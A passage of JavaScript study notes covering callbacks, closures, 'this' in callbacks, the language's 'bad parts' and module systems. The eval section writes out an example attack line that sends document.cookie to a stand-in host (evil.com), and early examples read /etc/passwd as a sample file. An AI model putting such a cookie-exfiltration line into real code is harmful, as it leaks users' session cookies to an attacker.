const fs = require('fs');

function callbackFunc(err, data) {
    console.log(String(data));
}

fs.readFile('/etc/passwd', callbackFunc);

// Step by step:
// 1. fs.readFile starts reading the file from disk
// 2. JavaScript does NOT wait — continues running other code
// 3. When the file is fully read (could take milliseconds):
//    → Node.js calls callbackFunc(null, <file contents>)
// 4. Inside callbackFunc:
//    → err  = null (no error)
//    → data = Buffer with file contents
//    → String(data) converts Buffer to readable text
//    → console.log prints it
```

---

#### Proper error handling in callbacks

In real code you always check `err` first:

```javascript
fs.readFile('/etc/passwd', function(err, data) {
    // ALWAYS check error first
    if (err) {
        console.log("Something went wrong:", err.message);
        return;   // stop here — data is undefined
    }
    // Only reach here if file was read successfully
    console.log(String(data));
});
```

What errors might happen:
```javascript
// File doesn't exist:
// err.message = "ENOENT: no such file or directory, open '/etc/passwd'"

// No permission to read:
// err.message = "EACCES: permission denied, open '/etc/passwd'"

// err = null means everything worked fine ✅
```

---

#### Synchronous version exists too — but blocks everything

```javascript
// Synchronous version — BLOCKS until file is read
const data = fs.readFileSync('/etc/passwd');
console.log(String(data));   // guaranteed to run after file loads
// BUT: nothing else can run while waiting — bad for servers/browsers
```

| | `fs.readFile` | `fs.readFileSync` |
|---|---|---|
| Blocks execution? | ❌ No | ✅ Yes |
| Callback needed? | ✅ Yes | ❌ No |
| OK for servers? | ✅ Yes | ❌ No (freezes server) |
| OK for startup scripts? | ✅ | ✅ acceptable |

---

#### Summary

```
Asynchronous = "start it now, tell me when done via callback"

Why it exists:
  → Disk, network, timers are SLOW (milliseconds to seconds)
  → JS is single-threaded — can't afford to freeze and wait
  → Hand slow work to background, keep JS running
  → When work finishes → callback is called with the result

fs.readFile('/etc/passwd', callbackFunc) means:
  fs           → Node.js file system module
  '/etc/passwd'→ path to the file to read
  callbackFunc → function to call when file is loaded
                 receives (err, data):
                   err  = error object, or null if ok
                   data = file contents as Buffer
```

> **The golden rule of async:** You can't use the result of an async operation on the next line. You can only use it **inside the callback** — because that's the only place where you know the data is ready.
> 

## Closures

An advanced programming language concept you need to know about:

### What is a Closure?

A closure is when a **function remembers the variables from the scope where it was created**, even after that scope has finished executing.

The simple version: **a function that carries its own backpack of variables with it**.

```
Closure = function + its backpack of remembered variables

The backpack contains:
  ✅ Variables declared in the outer function
  ✅ Arguments passed to the outer function
  ✅ Global variables

Key behaviors:
  ✅ Variables in the backpack PERSIST between calls
  ✅ Each function call creates a NEW independent backpack
  ✅ The backpack holds a REFERENCE (not a copy) — so the
     value can change (this is the fileNo bug!)

Used for:
  ✅ Private variables (IIFE module pattern)
  ✅ Stateful functions (counters, caches)
  ✅ Callbacks that need to remember context
  ⚠️  Be careful in loops — async callbacks share
     the loop variable by reference, not by value
```


```javascript
let globalVar = 1;

function localFunc(argVar) {
    let localVar = 0;
    function embedFunc() { return ++localVar + argVar + globalVar; }
    return embedFunc;       // returns the FUNCTION ITSELF, not the result
}

let myFunc = localFunc(10); // What happens if I call myFunc()? Again?
```

- `myFunc` closure contains `argVar`, `localVar` and `globalVar`

---



Let's trace exactly what happens:

#### Step 1 — Call `localFunc(10)`
```javascript
// Inside localFunc:
argVar   = 10    // passed in as argument
localVar = 0     // created inside localFunc

// embedFunc is defined — it can SEE argVar and localVar
// localFunc then RETURNS embedFunc (the function itself)
// localFunc finishes — you'd expect argVar and localVar to disappear...
// BUT THEY DON'T — because embedFunc has closed over them!
```

#### Step 2 — `myFunc` now holds `embedFunc` + its backpack
```
myFunc = embedFunc  +  backpack {
                           localVar  → 0    (lives on!)
                           argVar    → 10   (lives on!)
                           globalVar → 1    (from global scope)
                       }
```

#### Step 3 — Call `myFunc()` the first time
```javascript
myFunc();
// embedFunc runs: ++localVar + argVar + globalVar
//                  ++0       + 10     + 1
//                = 1 + 10 + 1
//                = 12

// localVar is now 1 inside the backpack
```

#### Step 4 — Call `myFunc()` again
```javascript
myFunc();
// embedFunc runs: ++localVar + argVar + globalVar
//                  ++1       + 10     + 1
//                = 2 + 10 + 1
//                = 13

// localVar is now 2 — it PERSISTS between calls!
```

The key insight: **`localVar` keeps its value between calls** because it lives in the closure's backpack, not on the regular call stack.

---

### A simpler closure example first

```javascript
function makeCounter() {
    let count = 0;          // this variable is "closed over"

    return function() {
        count++;
        return count;
    };
}

const counter = makeCounter();
// makeCounter() is done — you'd think count disappears
// but the returned function still holds onto it!

counter();   // 1
counter();   // 2
counter();   // 3  — count persists!

// Make a SECOND independent counter
const counter2 = makeCounter();
counter2();  // 1  — its OWN separate count, starts fresh
counter2();  // 2

counter();   // 4  — counter1 is unaffected by counter2
```

Each call to `makeCounter()` creates a **separate backpack** — `counter` and `counter2` have their own independent `count` variables.

---

### IIFE — Using Closures to Avoid Global Variables
> Using scopes and closures to create modules in early JavaScript.

**Global (with globals):**

```javascript
// ❌ With globals — i and f pollute the global scope
var i = 1;
function f() {
    i++;
    return i;
}
// Anyone anywhere can accidentally overwrite i or f!
window.i = "oops";   // breaks everything
```


**No globals (using IIFE module pattern):**

```javascript
// ✅ IIFE (Immediately Invoked Function Expression)
// wraps everything in a function that runs immediately
const f = (function() {
    var i = 1;          // i is PRIVATE — trapped inside the closure

    function f() {
        i++;
        return i;
    }

    return f;           // only expose f — i stays hidden
})();
//  ↑↑ these () call the function immediately

f();   // 2  — works fine
f();   // 3
i;     // ❌ ReferenceError — i is not accessible outside!
```

The IIFE creates a closure. `i` is trapped inside — no global pollution. This is exactly the **"module pattern"** your lecture notes mention.

---

### Using Closures for Private Object Properties

```javascript
let myObj = (function() {
    // These variables are PRIVATE — trapped in the closure
    let privateProp1 = 1;
    let privateProp2 = "test";

    let setPrivate1 = function(val1) {
        privateProp1 = val1;       // can access private vars ✅
    };

    let compute = function() {
        return privateProp1 + privateProp2;  // can access private vars ✅
    };

    // Only return what you want to be PUBLIC
    return {
        compute:     compute,
        setPrivate1: setPrivate1
    };
})();
```

What can you access?
```javascript
typeof myObj;             // 'object'
Object.keys(myObj);       // ['compute', 'setPrivate1']  — only public methods

myObj.compute();          // 1 + "test" = "1test"   ✅
myObj.setPrivate1(42);    // changes privateProp1 to 42
myObj.compute();          // 42 + "test" = "42test"  ✅

myObj.privateProp1;       // undefined ❌ — truly private, can't reach it!
myObj.privateProp2;       // undefined ❌ — truly private!
```

The public methods `compute` and `setPrivate1` form a **closure over** `privateProp1` and `privateProp2` — they can see and change them, but the outside world cannot.

---


### Closures Can Be Tricky with Imperative Code

```javascript
// Read files './file0' and './file1' and return their length
for (let fileNo = 0; fileNo < 2; fileNo++) {
    fs.readFile('./file' + fileNo, function (err, data) {
        if (!err) {
            console.log('file', fileNo, 'has length', data.length);
        }
    });
}
```

Ends up printing two files to console both starting with:
```
file 2 has length ...
```

**Why?** The for loop finishes (fileNo = 2) before the async callbacks run. Both closures reference the same `fileNo` variable, which is `2` by the time they execute.

---

#### Broken Fix #1 — Add a Local Variable

```javascript
for (let fileNo = 0; fileNo < 2; fileNo++) {
    var localFileNo = fileNo;                          // ← var (broken)
    fs.readFile('./file' + localFileNo, function (err, data) {
        if (!err) {
            console.log('file', localFileNo, 'has length', data.length);
        }
    });
}
```

Closure for callback now contains `localFileNo`. Unfortunately when the callback functions run `localFileNo` will be `1`. Better than before since one of the printed lines has the correct fileNo.

---

#### A Fix — Make a Private Copy of `fileNo` Using a Call

```javascript
function printFileLength(aFileNo) {
    fs.readFile('./file' + aFileNo, function (err, data) {
        if (!err) {
            console.log('file', aFileNo, 'has length', data.length);
        }
    });
}

for (let fileNo = 0; fileNo < 2; fileNo++) {
    printFileLength(fileNo);
}
```

> **Note:** This works but sometimes it prints the file0 line first and sometimes the file1 line first.

---

#### Another Fix — Make a Private Copy of `fileNo` with `let`

```javascript
for (var fileNo = 0; fileNo < 2; fileNo++) {
    let localFileNo = fileNo;                          // ← let (correct)
    fs.readFile('./file' + localFileNo, function (err, data) {
        if (!err) {
            console.log('file', localFileNo, 'has length', data.length);
        }
    });
}
```

> **Note:** Same out-of-order execution as previous fix.

---



### Beware of `this` and Nested Functions

```javascript
'use strict';
function readFileMethod() {
    fs.readFile(this.fileName, function (err, data) {
        if (!err) {
            console.log(this.fileName, 'has length', data.length); // ❌
        }
    });
}

let obj = {fileName: "aFile", readFile: readFileMethod};
obj.readFile();
```

> Generates error on the `console.log` statement since `this` is `undefined`.

---

### Beware of `this` and Nested Functions — Workaround

```javascript
'use strict';
function readFileMethod() {
    fs.readFile(this.fileName, (err, data) => {   // arrow function ✅
        if (!err) {
            console.log(this.fileName, 'has length', data.length);
        }
    });
}

let obj = {fileName: "aFile", readFile: readFileMethod};
obj.readFile();
```

> Works since an **arrow function doesn't smash `this`**.

---


## JavaScript Object Notation (JSON)

```javascript
let obj = { ps: 'str', pn: 1, pa: [1, 'two', 3, 4], po: { sop: 1 } };

let s = JSON.stringify(obj);
// s = '{"ps":"str","pn":1,"pa":[1,"two",3,4],"po":{"sop":1}}'

typeof s == 'string'

JSON.parse(s); // returns object with same properties
```

- JSON is the **standard format** for sending data to and from a browser

---

## JavaScript: The Bad Parts

**Declaring variables on use** — Workaround: Force declarations
```javascript
let myVar = 2 * typeoVar + 1;
```

**Automatic semicolon insertion** — Workaround: Enforce semicolons with checkers
```javascript
return
    "This is a long string so I put it on its own line"; // ❌ returns undefined!
```

**Type coercing equals `==`** — Workaround: Always use `===`, `!==` instead
```javascript
("" == "0")    // false
(0 == "")      // true
(0 == '0')     // true
(false == '0') // true
(null == undefined) // true
```

**`with`, `eval`** — Workaround: Don't use them.

---

### Bad Part 1 — Declaring Variables on Use

In JavaScript (without `"use strict"`), you can use a variable **without ever declaring it**. JavaScript silently creates a **global variable** for you:

```javascript
function calculateTotal() {
    total = 0;          // ❌ forgot 'let' — JS silently creates a global!
    total += 100;
    return total;
}

calculateTotal();
console.log(total);     // 100 — total leaked into global scope!
```

The real danger — **typos create silent bugs**:

```javascript
let myVariable = 42;

// Later in code — you mistype the variable name:
let result = 2 * myVarable + 1;
//                ↑ typo! missing 'i'
// JS doesn't crash — it creates a NEW global 'myVarable' = undefined
// result = 2 * undefined + 1 = NaN
// No error thrown — silent bug that's very hard to find!
```

This is exactly what your lecture shows:
```javascript
let myVar = 2 * typeoVar + 1;
//               ↑ typo of some other variable name
//               JS creates a new global instead of throwing an error
```

**The workaround — `"use strict"`:**
```javascript
"use strict";   // add this at top of file or function

let myVariable = 42;
let result = 2 * myVarable + 1;
// ❌ ReferenceError: myVarable is not defined  ← caught immediately! ✅
```

With strict mode, using an undeclared variable **throws an error immediately** instead of silently creating a global.

---

### Bad Part 2 — Automatic Semicolon Insertion (ASI)

JavaScript tries to be "helpful" by **automatically inserting semicolons** where it thinks they belong. This backfires badly in some cases.

#### The `return` problem:

```javascript
// What you write — thinking the string is the return value:
function getMessage() {
    return
        "This is a long string so I put it on its own line";
}

// What JavaScript ACTUALLY sees after ASI:
function getMessage() {
    return;          // ← semicolon inserted here! returns undefined
        "This is a long string so I put it on its own line";  // unreachable!
}

getMessage();   // undefined  ❌ — silently wrong!
```

JavaScript sees `return` followed by a newline and inserts a semicolon right there — the string on the next line is never returned.

**The fix — keep the return value on the same line:**
```javascript
// ✅ Correct — opening of expression on same line as return
function getMessage() {
    return "This is a long string so I put it " +
           "on its own line";
}

// ✅ Also correct — use parentheses (common in React)
function getMessage() {
    return (
        "This is a long string so I put it on its own line"
    );
}

getMessage();   // "This is a long string..." ✅
```

#### Other ASI surprises:
```javascript
// You think this is two separate expressions:
const a = 1
const b = 2
[a, b] = [b, a]    // trying to swap values

// JavaScript reads it as:
const a = 1
const b = 2[a, b] = [b, a]   // ❌ tries to index into 2 — TypeError!
// ASI did NOT insert semicolon before [ because [ can continue a statement

// Fix — always use semicolons explicitly:
const a = 1;
const b = 2;
[a, b] = [b, a];   // ✅ now it's clear
```

**The workaround — always write explicit semicolons** and use a linter (eslint) to enforce them.

---

### Bad Part 3 — Type Coercing `==`

This is one of JavaScript's most infamous problems. The `==` operator tries to **convert (coerce) types** before comparing, following a complex set of rules that produce completely unintuitive results.

#### Walking through each example:

```javascript
// 1. ("" == "0") → false
// Both are strings — no coercion needed, direct comparison
// "" and "0" are different strings → false
"" == "0"       // false


// 2. (0 == "") → true   ← SURPRISING!
// 0 is number, "" is string
// Rule: convert string to number → Number("") = 0
// Now comparing 0 == 0 → true
0 == ""         // true  ❌


// 3. (0 == '0') → true  ← SURPRISING!
// 0 is number, '0' is string
// Rule: convert string to number → Number('0') = 0
// Now comparing 0 == 0 → true
0 == '0'        // true  ❌


// 4. (false == '0') → true  ← VERY SURPRISING!
// false is boolean, '0' is string
// Rule: convert boolean to number → Number(false) = 0
// Now comparing 0 == '0'
// Rule: convert string to number → Number('0') = 0
// Now comparing 0 == 0 → true
false == '0'    // true  ❌  (two coercions happen!)


// 5. (null == undefined) → true
// Special rule: null and undefined are only == to each other
// and to nothing else
null == undefined   // true
null == 0           // false
null == ""          // false
null == false       // false
```

#### The transitive logic breakdown

Math tells us: if A == B and B == C then A == C. Not in JavaScript with `==`:

```javascript
// From the examples above:
0  == ""        // true
0  == '0'       // true

// So you'd expect:
"" == '0'       // false ❌ — transitivity BREAKS!
```

This is the famous **"JavaScript equality table"** — almost nothing makes intuitive sense with `==`.

#### `===` strict equality — always use this instead

`===` **never coerces types**. If types are different, it immediately returns `false`:

```javascript
// All of these are false with === (correct, intuitive behavior)
0   === ""          // false ✅ — different types
0   === '0'         // false ✅ — different types
false === '0'       // false ✅ — different types
null === undefined  // false ✅ — different types

// Only true when BOTH value AND type match:
1   === 1           // true  ✅
"a" === "a"         // true  ✅
0   === 0           // true  ✅
null === null        // true  ✅
```

#### A real-world bug this causes:

```javascript
// User input from a form always comes as a STRING
const userInput = "5";    // user typed 5

// Checking with ==
if (userInput == 5) {     // "5" == 5 → true (coercion)
    console.log("correct!");  // ✅ seems fine...
}

// But then:
if (userInput == true) {  // "5" == true → ??
    // true → 1, "5" → 5, 5 == 1 → false... or is it?
    // Confusing and unpredictable!
}

// With === everything is predictable:
userInput === 5           // false — string !== number, always clear
Number(userInput) === 5   // true  — explicit conversion, clear intent ✅
```

---

### Bad Part 4 — `with` and `eval`

#### `with` — creates ambiguous scope

`with` lets you access object properties without typing the object name. It seems convenient but makes code **impossible to understand or optimize**:

```javascript
const person = { name: "Alice", age: 23, city: "LA" };

// 'with' lets you skip writing 'person.' each time
with (person) {
    console.log(name);   // "Alice" — but is this person.name or a global 'name'?
    console.log(age);    // 23
    console.log(city);   // "LA"
}

// The problem — deeply ambiguous:
let name = "Global Name";

with (person) {
    console.log(name);   // Is this person.name or the outer 'name' variable?
                         // Impossible to tell without running the code!
}
```

`with` makes it impossible for tools (linters, compilers, engines) to know where a variable comes from. It's **banned in strict mode**:

```javascript
"use strict";
with (person) { ... }   // ❌ SyntaxError — not allowed in strict mode
```

**The fix — just be explicit:**
```javascript
// ✅ Clear, unambiguous
console.log(person.name);
console.log(person.age);
console.log(person.city);
```

---

#### `eval` — executes a string as code

`eval` takes a **string** and runs it as JavaScript code. This is dangerous for multiple reasons:

```javascript
// Basic eval — runs a string as code
eval("console.log('hello')");   // "hello"
eval("1 + 1");                  // 2

// The dangers:

// 1. Security — user input can execute arbitrary code
const userInput = "fetch('https://evil.com?data=' + document.cookie)";
eval(userInput);   // ❌ sends user's cookies to an attacker!

// 2. Debugging is a nightmare
const operation = "add";
eval(operation + "(2, 3)");   // What does this run? Who knows without tracing!

// 3. Performance — JS engine can't optimize code it doesn't know ahead of time
for (let i = 0; i < 10000; i++) {
    eval("i * 2");   // engine must parse and compile a string every iteration ❌
}

// 4. Scope access — eval can read and MODIFY local variables
let secret = "password123";
eval("secret = 'hacked'");
console.log(secret);   // "hacked" ❌ — eval reached into local scope!
```

**The fix — never use `eval`.** Everything `eval` does can be done better another way:

```javascript
// Instead of eval for dynamic operations — use a lookup object:
const operations = {
    add:      (a, b) => a + b,
    subtract: (a, b) => a - b,
    multiply: (a, b) => a * b,
};

const operation = "add";
operations[operation](2, 3);   // 5  ✅ — safe, fast, clear
```

---

### All 4 Bad Parts — Quick Reference

| Bad Part | The Problem | The Workaround |
|---|---|---|
| Undeclared variables | Typos create silent globals | `"use strict"` + always use `let`/`const` |
| Automatic semicolons | `return` on its own line returns `undefined` | Always write `;` explicitly, use linter |
| `==` type coercion | Unpredictable comparisons across types | Always use `===` and `!==` |
| `with` | Ambiguous scope, unreadable code | Use explicit `object.property` |
| `eval` | Security risk, slow, scope pollution | Use functions/objects instead |

> **The common thread through all bad parts:** JavaScript was designed to **never throw errors** and always try to do *something* — silently creating globals, inserting semicolons, coercing types. This "helpfulness" produces silent bugs that are extremely hard to track down. The workarounds all push JavaScript to **fail loudly and early** instead.

## Some JavaScript Idioms

**Assign a default value:**
```javascript
hostname = hostname || "localhost";
port     = port     || 80;
```

**Access a possibly undefined object property:**
```javascript
let prop = obj && obj.propname;
```

**Handling multiple `this` — Problem:**
```javascript
fs.readFile(this.fileName + fileNo, function (err, data) {
    console.log(this.fileName, fileNo); // ❌ Wrong this!
});
```

- **Handling multiple `this` — Fix with `self`:**
    ```javascript
    let self = this;
    fs.readFile(self.fileName + fileNo, function (err, data) {
        console.log(self.fileName, fileNo); // ✅
    });
    ```

- **Handling multiple `this` — Fix with arrow function:**
    ```javascript
    fs.readFile(this.fileName + fileNo, (err, data) =>
        console.log(this.fileName, fileNo)  // ✅ arrow function keeps this
    );
    ```

---

### Idiom 1 — Assigning a Default Value with `||`

#### How it works — understanding `||` in JavaScript

In JavaScript, `||` doesn't just work with `true`/`false`. It returns **the first "truthy" value** it finds, or the last value if none are truthy.

First, understand **truthy vs falsy**:

```javascript
// FALSY values — these all behave like false:
false
0
""          // empty string
null
undefined
NaN

// TRUTHY values — everything else:
"localhost"   // non-empty string
80            // non-zero number
{}            // any object
[]            // any array
"false"       // the STRING "false" is truthy!
```

#### How `||` actually evaluates:

```javascript
// A || B means:
// "If A is truthy, return A. Otherwise return B."

"hello" || "default"    // "hello"    — first is truthy, return it
""      || "default"    // "default"  — first is falsy, return second
null    || "default"    // "default"  — first is falsy, return second
0       || 80           // 80         — 0 is falsy, return second
5       || 80           // 5          — 5 is truthy, return it
```

#### The default value pattern:

```javascript
// Without the idiom — verbose
function connect(hostname, port) {
    if (hostname === undefined || hostname === null || hostname === "") {
        hostname = "localhost";
    }
    if (port === undefined || port === null || port === 0) {
        port = 80;
    }
}

// With the idiom — clean and short
function connect(hostname, port) {
    hostname = hostname || "localhost";
    port     = port     || 80;

    console.log("Connecting to", hostname, "on port", port);
}

connect();                    // "Connecting to localhost on port 80"
connect("example.com");       // "Connecting to example.com on port 80"
connect("example.com", 8080); // "Connecting to example.com on port 8080"
connect("", 0);               // "Connecting to localhost on port 80"
//         ↑  ↑ both falsy — defaults kick in
```

#### ⚠️ The trap — when 0 or "" is a valid value:

```javascript
function setVolume(level) {
    level = level || 50;    // ❌ intention: default to 50 if not provided
    console.log("Volume:", level);
}

setVolume(100);   // "Volume: 100" ✅
setVolume(0);     // "Volume: 50"  ❌ — 0 is falsy! User wanted 0 (mute)!
setVolume();      // "Volume: 50"  ✅
```

**Modern fix — use `??` (Nullish Coalescing, ES2020):**
```javascript
function setVolume(level) {
    level = level ?? 50;    // ✅ only defaults if null or undefined (not 0!)
    console.log("Volume:", level);
}

setVolume(100);   // "Volume: 100" ✅
setVolume(0);     // "Volume: 0"   ✅ — 0 is kept!
setVolume();      // "Volume: 50"  ✅ — undefined → default

// ?? only treats null and undefined as "missing"
// || treats all falsy values (0, "", false, null, undefined) as "missing"
```

---

### Idiom 2 — Accessing a Possibly Undefined Property with `&&`

#### How `&&` actually evaluates:

```javascript
// A && B means:
// "If A is falsy, return A (stop). Otherwise return B."

null      && "anything"    // null       — stops at null (falsy)
undefined && "anything"    // undefined  — stops at undefined (falsy)
0         && "anything"    // 0          — stops at 0 (falsy)
"hello"   && "world"       // "world"    — "hello" is truthy, return second
{name:"Alice"} && "found"  // "found"    — object is truthy, return second
```

#### The problem it solves — accessing nested properties safely:

```javascript
// Without the idiom — accessing property of potentially undefined object
let obj = null;   // maybe an API returned null, or data isn't loaded yet

console.log(obj.propname);   // ❌ TypeError: Cannot read property of null
                             // CRASHES your entire program!
```

```javascript
// With the idiom — safe access
let prop = obj && obj.propname;

// If obj is null/undefined:   null && anything  → returns null  (no crash!)
// If obj exists:              obj  && obj.prop   → returns obj.prop ✅
```

#### Real examples:

```javascript
// User might not be logged in
const user = null;   // not logged in yet

// ❌ Without guard — crashes
console.log(user.name);        // TypeError!

// ✅ With && guard
let name = user && user.name;  // null — safe, no crash
console.log(name);             // null

// ---- When user IS logged in ----
const user = { name: "Alice", address: { city: "LA" } };

let name    = user && user.name;                    // "Alice"
let city    = user && user.address && user.address.city;  // "LA"
let zipCode = user && user.address && user.address.zip;   // undefined (safe)
```

#### Deep nesting gets verbose — modern fix with `?.` (Optional Chaining, ES2020):

```javascript
const user = { name: "Alice", address: { city: "LA" } };

// Old way — verbose && chain
let city = user && user.address && user.address.city;

// Modern way — ?. optional chaining (much cleaner)
let city    = user?.address?.city;      // "LA"
let zipCode = user?.address?.zip;       // undefined (safe, no crash)
let phone   = user?.contact?.phone;     // undefined (safe, no crash)

// Also works for methods:
let upper = user?.getName?.();          // calls getName() if it exists, else undefined
```

---

### Idiom 3 — Handling Multiple `this`

This is the most important idiom. Let's build up the problem step by step.

#### Why `this` gets lost in callbacks

```javascript
const server = {
    fileName: "data.txt",
    port: 3000,

    readData: function() {
        console.log("Starting read, this =", this);  // ✅ this = server

        fs.readFile(this.fileName, function(err, data) {
            // ❌ This callback is called by fs.readFile later
            // fs.readFile doesn't know about 'server'
            // It calls the function as a plain function → this = undefined
            console.log(this.fileName);   // ❌ TypeError: this is undefined
        });
    }
};

server.readData();
```

The problem visualized:
```
server.readData()
│
│  this = server ✅
│
└─► fs.readFile(filename, callback)
              │
              │  JS hands the callback to fs
              │  fs stores it and calls it later
              │  fs has NO idea about 'server'
              │
              └─► callback(err, data)
                  │
                  this = undefined ❌
                  (plain function call in strict mode)
```

---

#### Fix 1 — Save `this` as `self`

```javascript
const server = {
    fileName: "data.txt",

    readData: function() {
        let self = this;    // ← capture 'this' RIGHT NOW while it's correct
                            // 'self' is a regular variable — closures keep it!

        fs.readFile(self.fileName, function(err, data) {
            // 'this' here is wrong — but we don't use it!
            // We use 'self' from the closure instead ✅
            console.log(self.fileName, 'has length', data.length);
            //          ↑ self is captured in the closure — always points to server
        });
    }
};
```

Why does `self` work?
```
readData() runs:
│
│  this = server
│  self = this = server   ← stored in closure's backpack
│
└─► fs.readFile callback runs later:
    │
    │  this = undefined ❌ (broken)
    │  self = server    ✅ (from closure backpack — still there!)
    │
    └─► self.fileName = "data.txt"  ✅
```

This works but has a downside — you need to remember to use `self` instead of `this` everywhere inside the callback. It's easy to accidentally use `this` by mistake.

---

#### Fix 2 — Arrow Function (best modern solution)

```javascript
const server = {
    fileName: "data.txt",

    readData: function() {
        // Arrow function — has NO own 'this'
        // Inherits 'this' from readData() — which is server ✅
        fs.readFile(this.fileName, (err, data) => {
            console.log(this.fileName, 'has length', data.length);
            //          ↑ 'this' works correctly! = server ✅
        });
    }
};
```

Why does the arrow function fix it?
```
readData() runs:
│
│  this = server
│
└─► Arrow function callback:
    │
    │  Arrow functions have NO own 'this'
    │  They look outward to where they were WRITTEN
    │  They were written inside readData() where this = server
    │
    └─► this = server  ✅  (inherited, not overwritten)
```

---

#### All three approaches side by side — a complete example

```javascript
const fileReader = {
    fileName: "myFile.txt",
    fileNo: 1,

    // ❌ Approach 1 — broken
    readBroken: function() {
        fs.readFile(this.fileName, function(err, data) {
            console.log(this.fileName);   // TypeError — this is undefined
        });
    },

    // ✅ Approach 2 — self workaround
    readWithSelf: function() {
        let self = this;                  // capture correct 'this'
        fs.readFile(self.fileName, function(err, data) {
            console.log(self.fileName, 'loaded');   // ✅ uses self, not this
        });
    },

    // ✅ Approach 3 — arrow function (cleanest)
    readWithArrow: function() {
        fs.readFile(this.fileName, (err, data) => {
            console.log(this.fileName, 'loaded');   // ✅ this inherited
        });
    }
};
```

---

### When to use each fix

```
Problem: 'this' is lost inside a callback

Fix 1 — let self = this
  ✅ Works in all JS versions (ES5 and older)
  ✅ Good when you genuinely need both 'this' and 'self'
  ⚠️  Easy to accidentally write 'this' instead of 'self'
  ⚠️  Extra variable to maintain

Fix 2 — Arrow function  (recommended today)
  ✅ Clean — no extra variable needed
  ✅ You keep using 'this' naturally
  ✅ Impossible to accidentally use wrong 'this'
  ✅ Standard modern JavaScript
  ⚠️  Not available in ES5 (pre-2015)
```

---

### Summary

```
Idiom 1 — Default values:
  variable = variable || defaultValue
  Use when: parameter might be missing/null/undefined
  Watch out: || treats 0 and "" as missing too
  Modern alternative: variable ?? defaultValue  (only null/undefined)

Idiom 2 — Safe property access:
  let prop = obj && obj.propname
  Use when: obj might be null or undefined
  Prevents: TypeError crashes on null/undefined
  Modern alternative: obj?.propname  (optional chaining)

Idiom 3 — Fixing 'this' in callbacks:
  Problem:  regular function callbacks lose 'this'
  Fix A:    let self = this  (old way — closure captures correct 'this')
  Fix B:    arrow function   (modern way — inherits 'this' automatically)
  Rule:     always use arrow functions for callbacks inside methods
```

---

# JavaScript New Features

## ECMAScript

- New standard for ECMAScript released **yearly**
  - Relatively easy to get a new feature into the language
- **Transpiling:** Translate new language to old style JavaScript
  - Allows front-end software to be coded with new features but run everywhere
  - For example: Babel — check out: https://babeljs.io/en/repl (new JS in → old JS out)
- Frontend frameworks are aggressively using new language features
  - **React.js** — Encourages use of newer ECMAScript features
  - **Angular** — Encourages TypeScript — Extended JavaScript with static types and type checking

---

## Lots of New Features in ECMAScript

Already seen a few:
- `let`, `const`, `class`, `=>`

Here are a few more you might encounter:
- Modules
- Default parameters
- Rest parameters `...`
- Spread operator `...`
- Destructuring assignment
- Template string literals
- `Set`, `Map`, `WeakSet`, `WeakMap` objects, async programming

---

## CommonJS vs ES Modules

### Modules — Variables Global to a File, Not System
**Old Way** — Use Immediately Invoked Function Expressions (IIFE) using closures to make module variables function-scoped and only return a single object to access them:

```javascript
var exportedName = (function () {
    var x, y, z;
    ...
    return { x: x, y: y };
})();
```

**New Way** — Can explicitly define file's exports and then import the module in another file:

```javascript
var x, y, z;
...
var exportedName = { x: x, y: y };
export exportedName;
```

Two common ways:
- **CommonJS** (Node.js): `module.exports` / `require()`
- **ECMAScript 6**: `export` / `import`


```
CommonJS  (require/module.exports)
  ✅ Default in Node.js
  ✅ Synchronous loading
  ✅ Works anywhere in code
  ✅ Use for: Node.js projects, test runners, older codebases

ES Modules (import/export)
  ✅ Official JS standard
  ✅ Native browser support
  ✅ Static analysis (better for bundlers, tree-shaking)
  ✅ Use for: modern browsers, React/Angular/Vue projects
```


```
                CommonJS                    ES Modules
                ──────────────────────────────────────────────
Syntax          require() / module.exports  import / export
Created         2009 (Node.js)              2015 (ES6 standard)
Used in         Node.js                     Browsers + modern Node.js
Loading         Synchronous                 Asynchronous
Import location Anywhere in code            Top of file only
File extension  .js                         .js or .mjs
In package.json "type": "commonjs"          "type": "module"
                (default)
```


#### The Core Problem They Both Solve

JavaScript originally had **no module system** — every file shared one global scope. If two files used a variable named `x`, they'd clash:

```
Without modules:
┌─────────────┐    ┌─────────────┐
│  fileA.js   │    │  fileB.js   │
│  var x = 1  │    │  var x = 2  │  ← ❌ clash! both in global scope
│  var y = 2  │    │  var y = 5  │
└─────────────┘    └─────────────┘
         both loaded → x = ??? y = ???
```

Modules fix this by giving each file **its own private scope** and letting files explicitly choose what to share.

---

### CommonJS (CJS) — Node.js style

Created for Node.js in 2009. Uses `require()` and `module.exports`.

#### Exporting

```javascript
// math.js — CommonJS export

const PI = 3.14159;

function add(a, b) {
    return a + b;
}

function multiply(a, b) {
    return a * b;
}

// Explicitly choose what to expose
module.exports = {
    PI:       PI,
    add:      add,
    multiply: multiply
};
// Everything NOT in module.exports stays private
```

#### Importing

```javascript
// app.js — CommonJS import

const math = require('./math');       // import whole object
console.log(math.add(2, 3));          // 5
console.log(math.PI);                 // 3.14159

// Or destructure what you need:
const { add, multiply } = require('./math');
add(2, 3);        // 5
multiply(2, 3);   // 6

// Import a built-in Node.js module (no path needed):
const fs   = require('fs');
const path = require('path');

// Import an npm package:
const express = require('express');
```

#### Key characteristics of CommonJS

```javascript
// 1. require() is SYNCHRONOUS — loads file immediately, blocks until done
const data = require('./bigFile');   // waits here until file loads
console.log(data);                   // guaranteed to have data

// 2. require() can be called ANYWHERE — inside functions, if blocks, loops
function loadIfNeeded(condition) {
    if (condition) {
        const tool = require('./tool');   // ✅ dynamic, conditional loading
        tool.run();
    }
}

// 3. require() returns a plain JavaScript OBJECT
const math = require('./math');
typeof math;   // "object"

// 4. Circular requires are handled (carefully)
// fileA.js requires fileB.js which requires fileA.js → partial object returned
```

---

### ES Modules (ESM) — ECMAScript 6 style

Official JavaScript standard since 2015. Uses `export` and `import`. Used by browsers natively and modern Node.js.

#### Exporting

```javascript
// math.js — ES Module export

export const PI = 3.14159;           // named export inline

export function add(a, b) {          // named export inline
    return a + b;
}

export function multiply(a, b) {     // named export inline
    return a * b;
}

// OR export all at the bottom:
const PI       = 3.14159;
function add(a, b)      { return a + b; }
function multiply(a, b) { return a * b; }

export { PI, add, multiply };        // named exports

// Default export — one per file
export default function divide(a, b) {
    return a / b;
}
```

#### Importing

```javascript
// app.js — ES Module import

// Named imports — must match export names exactly
import { PI, add, multiply } from './math.js';
add(2, 3);      // 5
console.log(PI) // 3.14159

// Rename while importing
import { add as sum } from './math.js';
sum(2, 3);      // 5

// Default import — you choose the name
import divide from './math.js';
divide(10, 2);  // 5

// Import everything as a namespace object
import * as math from './math.js';
math.add(2, 3);      // 5
math.PI;             // 3.14159

// Import npm package
